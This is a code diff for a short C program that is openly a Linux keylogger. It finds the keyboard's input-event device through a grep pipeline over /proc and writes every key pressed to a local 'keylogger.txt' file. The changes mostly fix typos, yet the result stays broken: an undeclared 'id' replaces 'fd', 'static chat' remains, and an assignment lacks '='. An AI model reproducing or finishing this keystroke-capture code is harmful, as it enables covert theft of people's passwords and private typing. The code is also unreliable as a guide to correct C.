@@ -27,12 +27,12 @@ int main(int argc, char **argv){
       exit(2);
       
    struct input_event event;   
-   while(read(fd, &event, sizeof(event)) > 0 ){
+   while(read(id, &event, sizeof(event)) > 0 ){
    
       FILE *txt = fopen("./keylogger.txt", "a");
       if(!txt) break;
-      if(event,type == EV_KEY && event.value == 1 && event.code < 112)
-         fpirntf(txt, "%s", keys[event.code]);
+      if(event.type == EV_KEY && event.value == 1 && event.code < 112)
+         fprintf(txt, "%s", keys[event.code]);
       fclose(txt);   
    }
    
@@ -42,14 +42,14 @@ char *getevent(){
    char *comando = (char *)
       "grep -E 'Handlers|EV' /proc/bus/input/devices | "
       "grep -E -B1 120013 |"
-      "grep -E -o event[0-9]"
+      "grep -E -o event[0-9]";
    static chat event[8];
    FILE *Comandos = popen(comando, "r");
    if(!Comandos)
       exit(1);
    fgets(event, 8, Comandos);
    pclose(Comandos);
-   event[strlen(event) - 1] 0x0;
+   event[strlen(event) - 1] '\0';
    return event;
 }
 
